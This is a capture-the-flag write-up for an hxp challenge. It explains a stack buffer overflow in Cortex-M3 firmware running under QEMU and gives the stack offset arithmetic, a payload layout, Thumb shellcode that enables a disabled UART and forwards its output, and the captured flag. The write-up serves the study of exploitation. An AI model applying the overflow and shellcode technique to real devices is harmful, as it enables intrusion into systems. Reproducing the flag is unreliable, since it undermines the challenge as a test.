# Cassandra / orakel-von-hxp writeup

## Overview
The service runs a Cortex-M3 firmware in QEMU. Input arrives on UART0 and the flag is continuously sent on UART1. The binary never enables UART1, and QEMU is patched so that any read/write to a disabled UART returns 0 and logs an error. To get the flag, we need to enable UART1 at runtime and forward its bytes to UART0.

## Vulnerability
In `src/src/main.c` the program reads user input with:

```
uint32_t buffer[0x20];
char *sbuf = (char *)buffer;
serial_fgets(sbuf, 0x200, (uart_regs*)UART0_BASE);
```

`buffer` is only 0x80 bytes, but `serial_fgets` allows up to 0x1ff bytes plus the terminator. This is a classic stack overflow that lets us overwrite the saved return address.

## Stack layout and address calculation
The stack pointer starts at the top of SRAM: `_sram_stacktop = 0x20010000`.

`_Reset_Handler` has a prologue that consumes 0x10 bytes and never restores it before calling `main`:

```
push {r7, lr}  ; 8 bytes
sub  sp, #8    ; 8 bytes
```

So `main` begins with `sp = 0x20010000 - 0x10 = 0x2000FFF0`.

`main` then does:

```
push {r7, lr}  ; 8 bytes
sub  sp, #0x90 ; 0x90 bytes
```

So the base of its frame is:

```
0x2000FFF0 - 0x98 = 0x2000FF58
```

The local `buffer` lives at the start of the frame, so:

```
buffer = 0x2000FF58
saved LR = buffer + 0x94
```

## Exploit strategy
1. Begin the payload with the exact string `I am enlightened` so the loop exits quickly and returns from `main` (avoids the random memory read path).
2. Place a small Thumb shellcode immediately after the first 16 bytes.
3. Overwrite the saved LR with the address of the shellcode (plus 1 for Thumb).

## Shellcode
The shellcode enables UART1 and then forwards all bytes from UART1 to UART0:

- UART1 base: `0x4000D000`
- UART0 base: `0x4000C000`
- DR offset:  `0x00`
- FR offset:  `0x18`
- CTL offset: `0x30`

Enable UART1 by writing `0x301` (UARTEN + RXE + TXE) to `UART1_CTL`.
Then loop:
- Wait for UART1 RXFE to clear.
- Read UART1 DR.
- Wait for UART0 TXFF to clear.
- Write byte to UART0 DR.

Assembly (Thumb):

```
.syntax unified
.thumb
.global _start
_start:
    ldr r0, =0x4000D030
    ldr r1, =0x00000301
    str r1, [r0]

loop:
    ldr r0, =0x4000D018
wait_rx:
    ldr r1, [r0]
    tst r1, #0x10
    bne wait_rx

    ldr r0, =0x4000D000
    ldr r1, [r0]

    ldr r0, =0x4000C018
wait_tx:
    ldr r2, [r0]
    tst r2, #0x20
    bne wait_tx

    ldr r0, =0x4000C000
    str r1, [r0]

    b loop
```

The compiled shellcode is 60 bytes and contains no newline bytes, so it is safe to send through `serial_fgets`.

## Payload layout
```
0x00 .. 0x0f  : "I am enlightened"
0x10 .. 0x4b  : shellcode
0x4c .. 0x8b  : padding
0x8c .. 0x8f  : saved sbuf pointer (any value)
0x90 .. 0x93  : padding
0x94 .. 0x97  : new LR = buffer + 0x10 + 1
```

Concrete values:

```
buffer base  = 0x2000FF58
shellcode pc = 0x2000FF58 + 0x10 + 1 = 0x2000FF69
```

## PoW and remote run
The service requires a small PoW:

```
./pow-solver 30 <hex_prefix>
```

The exploit script automates this, connects to the service, sends the payload, and prints the flag.

## Final flag
```
hxp{ich_will_nicht_mehr___ich_kann_nicht_mehr___ich_halte_das_alles_nicht_mehr_aus___e63b504b5c437f2f212f785294e5b01b}
```

## Files used
- `cassandra-von-hxp/exploit.py` runs the full PoW + exploit flow.
- `cassandra-von-hxp/pow-solver` is the compiled PoW helper.
